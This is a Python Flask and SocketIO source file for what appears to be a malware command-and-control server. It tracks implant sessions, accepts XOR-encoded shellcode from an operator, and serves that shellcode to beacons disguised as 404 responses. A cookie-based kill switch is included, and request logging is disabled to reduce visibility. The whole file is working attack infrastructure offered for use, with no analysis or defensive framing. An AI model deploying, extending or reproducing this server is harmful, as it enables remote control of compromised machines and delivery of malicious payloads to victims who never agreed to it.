import models
from flask import Flask, request, make_response, render_template, send_from_directory
from flask_sqlalchemy import SQLAlchemy
from flask_socketio import SocketIO
from models import Session
from threading import Lock
from shared_db import db
from custom import xor, FindSession

app = Flask(__name__, static_url_path='', static_folder="static")
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///database.sqlite"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True
db.init_app(app)
# Create model for the session table
socketio = SocketIO(app, async_mode=None, cors_allowed_origins='*')
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
import logging
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.disabled = True


with app.app_context():
    db.create_all()
    


thread = None
thread_lock = Lock()


def background_thread():
    while True:
        socketio.sleep(1)
        send_sessions()

@app.route("/")
def index():
    # return hello world
    return "Hello World"
@socketio.event
def connect():
    print('[+] Client connected')
    with thread_lock:
        global thread
        if thread is None:
            thread = socketio.start_background_task(target=background_thread)

@socketio.event
def cleardb():
    with app.app_context():
        Session.query.delete()
        print('[+] Cleared Database')
        db.session.commit()

@socketio.event
def kill(data):
    print('[+] Killing session')
    with app.app_context():
        session = Session.query.filter_by(id=data['id']).first()
        if session:
            session.kill = True
            db.session.commit()
            

@socketio.event
def load(data):
    print("[-] Loading session {}".format(data['id']))
    with app.app_context():
        session = Session.query.filter_by(id=data['id']).first()
        if session is not None:
            # save file to the folder shellcode with the name of the session id & xor it
            with open("shellcode/{}.bin".format(session.id), "wb") as f:
                f.write(xor(data['file']))
            session.loaded = True
            db.session.commit()
            f.close()
            print("[+] Loaded shellcode")
        else:
            print("[!] Session not found")


def send_sessions():
    with app.app_context():
        sessions = Session.query.all()
        sessions = [session.serialize for session in sessions]
        socketio.emit('sessions', sessions)

@app.errorhandler(404)
def default(t):
    print("[+] Request from: " +
          request.headers.get('X-Forwarded-For', request.remote_addr))
    # Try and find the session from the request
    session = FindSession(request)
    if session is not None:
        print("[+] Session found")
        # check if the session is loaded
        if session.kill:
            print("[+] Session killed")
            response = make_response(render_template('404.html'))
            response.set_cookie('session', "kill")
            return response
        if session.loaded:
            print("[+] Session is loaded")
            response = make_response(send_from_directory(
                'shellcode', '{0}.bin'.format(session.id)))
            response.set_cookie('session', "load")
            # update loaded to false
            session.loaded = False
            with app.app_context():
                db.session.commit()

            return response
        else:
            print("[+] Session is not loaded")
            return make_response(render_template("404.html"), 404)
    else:
        print("[!] Session not found")
        return make_response(render_template("404.html"), 404)


if __name__ == '__main__':
    app.debug = False

    socketio.run(app, port=23000, host="0.0.0.0",allow_unsafe_werkzeug=True)
